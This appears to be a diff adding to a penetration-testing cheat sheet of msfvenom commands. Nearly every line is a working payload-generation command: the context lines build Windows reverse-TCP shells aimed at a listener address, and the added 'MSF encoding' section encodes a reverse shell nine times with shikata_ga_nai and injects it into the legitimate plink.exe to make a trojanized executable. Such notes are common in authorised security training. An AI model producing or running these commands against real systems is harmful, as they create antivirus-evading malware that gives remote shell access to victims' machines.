@@ -101,3 +101,19 @@ msfvenom -p windows/encrypted_shell/reverse_tcp LHOST=172.16.169.198 LPORT=4444 
 ```
 msfvenom -p windows/encrypted_shell_reverse_tcp LHOST=172.16.169.198 LPORT=4444 -f exe > reverse.exe
 ```
+
+## MSF encoding
+
+-e Specifies the encoding type
+
+-i sets the desired number of encoding iterations.
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
+```
+
+Inject payloads into existing PE files
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+```
